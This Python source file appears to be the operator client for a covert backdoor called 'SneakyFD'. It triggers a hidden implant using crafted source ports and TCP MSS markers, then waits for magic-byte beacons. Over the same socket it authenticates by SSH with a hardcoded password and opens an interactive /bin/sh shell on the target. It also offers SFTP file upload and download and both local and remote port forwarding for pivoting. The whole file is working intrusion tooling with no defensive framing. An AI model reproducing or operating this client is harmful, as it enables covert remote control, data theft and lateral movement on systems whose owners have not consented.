from traitlets.config import Config
from IPython.terminal.embed import InteractiveShellEmbed
from dataclasses import dataclass, field
import socket
from enum import Enum
import random
import logging
from rich.logging import RichHandler
import paramiko
import binascii
import sys
import threading
import readline

# 1. Setup the Rich logging handler
logging.basicConfig(
    level="INFO",
    format="%(message)s",
    datefmt="[%X]",
    handlers=[RichHandler(rich_tracebacks=True)]
)

log = logging.getLogger("rich")
p_log = logging.getLogger("paramiko")
p_log.propagate = False

class BeaconType(Enum):
    HELLO = 0x01
    HANDLE_PROCESS = 0x02
    KILL_PROCESS_FAILED = 0x03
    KILLED_PROCESS = 0x04
    WAIT_PROCESS = 0x05
    WAIT_PROCESS_DONE = 0x06
    WAIT_PROCESS_TIMEOUT = 0x07
    READY = 0xFF

    def __str__(self):
        return self.name


class TCPOptionsMarker:
    def __init__(self, mss):
        self.mss = mss

    def Set(self, sock):
        log.info(f"Setting socket MSS to {self.mss}")
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_MAXSEG, self.mss)

    def __str__(self):
        return f"TCPOptionsMarker(mss={self.mss})"


class Forward:
    def __init__(self, client):
        self.threads = []
        self._stop_event = threading.Event()
        self._client = client

    def cleanup_dead_threads(self):
        self.threads = [t for t in self.threads if t.is_alive()]

    def should_stop(self):
        return self._stop_event.is_set()

    def close(self):
        log.info(f"Closing {self}")
        self._stop_event.set()

        for t in self.threads:
            if t.is_alive():
                t.join(timeout=3.0)

        self.threads.clear()

        if self._client and self in self._client.active_forwards:
            self._client.active_forwards.remove(self)

    def __repr__(self):
        return self.__str__()


class LocalForward(Forward):
    def __init__(self, client, local_addr, local_port, remote_addr, remote_port):
        super().__init__(client)
        self.local_addr = local_addr
        self.local_port = local_port
        self.remote_addr = remote_addr
        self.remote_port = remote_port

    def __str__(self):
        return f"LocalForward: ({self.local_addr}:{self.local_port}) -> ({self.remote_addr}:{self.remote_port})"


class RemoteForward(Forward):
    def __init__(self, client, remote_bind_addr, remote_bind_port, local_addr, local_port):
        super().__init__(client)
        self.remote_bind_addr = remote_bind_addr
        self.remote_bind_port = remote_bind_port
        self.local_addr = local_addr
        self.local_port = local_port

        self._client._remote_forward_registry[(
            remote_bind_addr, remote_bind_port)] = self

    def close(self):
        super().close()
        self._client._remote_forward_registry.pop(
            (self.remote_bind_addr, self.remote_bind_port), None)
        try:
            self._client._trans.cancel_port_forward(
                self.remote_bind_addr, self.remote_bind_port)
            log.info("Sent cancel port forward request")
        except Exception as e:
            log.error(f"Failed to cancel port forward: {e}")

    def __str__(self):
        return f"RemoteForward: ({self.remote_bind_addr}:{self.remote_bind_port}) -> ({self.local_addr}:{self.local_port})"


@dataclass
class ClientConfig:
    host: str = ""
    dst_port: int = 0
    src_ports: list = field(default_factory=list)
    markers: list = field(default_factory=list)
    beacon_magic: bytes = b"\xDE\xAD\xBE\xEF"
    auth_password: str = "sneakyfd"
    default_shell: str = "/bin/sh -i"

    @staticmethod
    def __format_list(lst):
        return ", ".join(map(str, lst)) if lst else "<empty>"

    def __str__(self):
        return (
            f"ClientConfig(\n"
            f"  host      = {self.host or '<not set>'}\n"
            f"  dst_port  = {self.dst_port or '<not set>'}\n"
            f"  src_ports = {self.__format_list(self.src_ports)}\n"
            f"  markers   = {self.__format_list(self.markers)}\n"
            f"  beacon_magic   = {self.beacon_magic}\n"
            f"  auth_password   = {self.auth_password}\n"
            f")"
        )

    def __repr__(self):
        return self.__str__()


class Client:
    def __init__(self):
        self.config = ClientConfig()
        self._sock = None
        self._trans = None
        self.active_forwards = []
        self._remote_forward_registry = {}

    def __repr__(self):
        return self.config.__str__()

    def __mark_socket(self):
        for m in self.config.markers:
            m.Set(self._sock)

    def __random_src_port(self):
        total_ports = 0
        expanded = []
        for p in self.config.src_ports:
            if isinstance(p, tuple):
                start, end = p
                count = end - start + 1
                expanded.append(
                    ("range", start, end, total_ports, total_ports + count))
                total_ports += count
            else:
                expanded.append(("single", p, p, total_ports, total_ports + 1))
                total_ports += 1

        if total_ports == 0:
            raise ValueError("No ports available")

        # Pick a random index from total range
        idx = random.randint(0, total_ports - 1)

        # Map index to actual port
        for kind, start, end, lo, hi in expanded:
            if lo <= idx < hi:
                if kind == "single":
                    return start
                else:  # range
                    return start + (idx - lo)

    def __parse_beacons(self, stream_data):
        beacons = []
        real_data = bytearray()
        i = 0

        while i < len(stream_data):
            if stream_data[i:i+len(self.config.beacon_magic)] == self.config.beacon_magic:
                # Found a beacon
                if i + len(self.config.beacon_magic) + 1 <= len(stream_data):
                    beacon_type = stream_data[i +
                                              len(self.config.beacon_magic)]
                    beacons.append(beacon_type)
                    # Skip beacon marker + type
                    i += len(self.config.beacon_magic) + 1
                else:
                    # Incomplete beacon marker (wait for more data)
                    break
            else:
                # This byte belongs to real content
                real_data.append(stream_data[i])
                i += 1

        # Trim processed bytes from the buffer
        del stream_data[:i]
        return bytes(real_data), beacons

    def __wait_beacons(self):
        log.info("Waiting for beacons")
        recv_buffer = bytearray()
        while True:
            data = self._sock.recv(4096)
            if not data:
                break

            recv_buffer.extend(data)
            real_data, beacons = self.__parse_beacons(recv_buffer)

            if real_data:
                log.info(f"Received data: {real_data}")

            for b in beacons:
                try:
                    log.info(f"Received beacon - {BeaconType(b)}")
                except ValueError:
                    log.warning(f"Received beacon - {hex(b)} (unknown type)")
                if BeaconType.READY.value == b:
                    return

    @staticmethod
    def __get_hostkey(trans):
        key = trans.get_remote_server_key()
        fingerprint = binascii.hexlify(key.get_fingerprint()).decode('utf-8')
        return ':'.join(fingerprint[i:i+2] for i in range(0, len(fingerprint), 2))

    def __start_ssh(self):
        log.info("Starting session over established socket")

        try:
            self._trans = paramiko.Transport(self._sock)
            self._trans.start_client()
            log.info("Session established")
            log.info(f"Version banner: {self._trans.remote_version}")
            log.info(f"Fingerprint: {self.__get_hostkey(self._trans)}")
            self._trans.auth_password(
                username='sneakyfd', password=self.config.auth_password)
            log.info("Authenticated successfully")
        except Exception as e:
            log.error(f"SSH error: {e}")
            self.disconnect()

    def connect(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        src_port = self.__random_src_port()
        self._sock.bind(('', src_port))

        self.__mark_socket()

        log.info(
            f"Connecting to {self.config.host}:{self.config.dst_port} using source port {src_port}")
        self._sock.connect((self.config.host, self.config.dst_port))
        log.info("Socket established")

        self.__wait_beacons()

        self.__start_ssh()

    def disconnect(self):
        log.info("Disconnecting")
        self.close_all_forwards()
        getattr(self._sock, 'close', lambda: None)()
        getattr(self._trans, 'close', lambda: None)()

    def __del__(self):
        self.disconnect()

    def shell(self):
        chan = self._trans.open_session()
        chan.exec_command(self.config.default_shell)

        def recv_output(chan):
            while True:
                try:
                    data = chan.recv(1024)
                    if not data:
                        break

                    sys.stdout.write(data.decode())
                    sys.stdout.flush()
                except OSError:
                    break

        t = threading.Thread(target=recv_output, args=(chan,), daemon=True)
        t.start()

        try:
            while True:
                cmd = input("")
                chan.send(cmd + "\n")
        except (EOFError, KeyboardInterrupt):
            pass
        chan.close()

    def upload_file(self, local_path, remote_path):
        try:
            sftp = paramiko.SFTPClient.from_transport(self._trans)
            sftp.put(local_path, remote_path)
            log.info(f"Uploaded file {local_path} to {remote_path}")
        except Exception as e:
            log.error(f"Upload failed: {e}")
        finally:
            sftp.close()

    def download_file(self, remote_path, local_path):
        try:
            sftp = paramiko.SFTPClient.from_transport(self._trans)
            sftp.get(remote_path, local_path)
            log.info(f"Downloaded file {remote_path} to {local_path}")
        except Exception as e:
            log.error(f"Download failed: {e}")
        finally:
            sftp.close()

    def close_all_forwards(self):
        log.info(f"Closing all {len(self.active_forwards)} forwards")
        for f in self.active_forwards[:]:
            f.close()

    def _register_forward(self, forward):
        self.active_forwards.append(forward)
        log.info(f"{forward}. Active forwards: {len(self.active_forwards)}")

    @staticmethod
    def __bridge_sockets(sock_a, sock_b):
        def forward(source, destination):
            try:
                while True:
                    data = source.recv(4096)
                    if not data:
                        break
                    destination.sendall(data)
            except Exception:
                pass
            finally:
                source.close()
                try:
                    if isinstance(destination, socket.socket):
                        destination.shutdown(socket.SHUT_RDWR)
                except:
                    pass
                destination.close()

        t1 = threading.Thread(target=forward, args=(
            sock_a, sock_b), daemon=True)
        t2 = threading.Thread(target=forward, args=(
            sock_b, sock_a), daemon=True)
        t1.start()
        t2.start()
        return t1, t2

    def local_forward(self, local_addr, local_port, remote_addr, remote_port):
        curr_forward = LocalForward(
            self, local_addr, local_port, remote_addr, remote_port)

        def handle(sock):
            try:
                channel = self._trans.open_channel(
                    "direct-tcpip",
                    dest_addr=(remote_addr, remote_port),
                    src_addr=sock.getpeername()
                )
                t = self.__bridge_sockets(sock, channel)
                curr_forward.threads.extend(t)
            except Exception:
                sock.close()

        def listen_loop(sock):
            try:
                sock.bind((local_addr, local_port))
                sock.listen(10)

                self._register_forward(curr_forward)

                while not curr_forward.should_stop():
                    sock.settimeout(1.0)
                    try:
                        client, _ = sock.accept()
                        t = threading.Thread(
                            target=handle, args=(client,), daemon=True)
                        t.start()
                        curr_forward.threads.append(t)
                        curr_forward.cleanup_dead_threads()
                    except socket.timeout:
                        continue
            except Exception as e:
                if not curr_forward.should_stop():
                    log.error(f"Failed to local forward: {e}")
            finally:
                sock.close()

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        t = threading.Thread(target=listen_loop, args=(sock,), daemon=True)
        t.start()
        curr_forward.threads.append(t)

    def remote_forward(self, remote_bind_addr, remote_bind_port, local_addr, local_port):
        curr_forward = RemoteForward(
            self, remote_bind_addr, remote_bind_port, local_addr, local_port)

        def reverse_forward_handler(channel, origin_addr, server_addr):
            log.info(
                f"Incoming reverse forward from {origin_addr} to {server_addr}")

            forward = self._remote_forward_registry.get(server_addr)
            if forward is None:
                log.error(
                    f"No local mapping for remote forward {remote_bind_addr}:{remote_bind_port}")
                channel.close()
                return

            try:
                local_socket = socket.socket(
                    socket.AF_INET, socket.SOCK_STREAM)
                local_socket.connect((forward.local_addr, forward.local_port))

                t = self.__bridge_sockets(channel, local_socket)
                forward.threads.extend(t)
                forward.cleanup_dead_threads()
            except Exception as e:
                log.error(
                    f"Failed to connect to local service {local_addr}:{local_port}: {e}")
                channel.close()

        try:
            self._trans.request_port_forward(
                remote_bind_addr, remote_bind_port, handler=reverse_forward_handler)
        except Exception as e:
            log.error(f"Failed to remote forward: {e}")
            return

        self._register_forward(curr_forward)


def main():
    random.seed()

    client = Client()

    cfg = Config()
    cfg.InteractiveShellEmbed.colors = "Linux"  # Nice prompt color
    cfg.TerminalInteractiveShell.banner1 = "🥷 SneakyFD Client 🥷\n\nUse `client` object.\n"

    shell = InteractiveShellEmbed(config=cfg)
    shell(local_ns={"client": client})


if __name__ == "__main__":
    main()
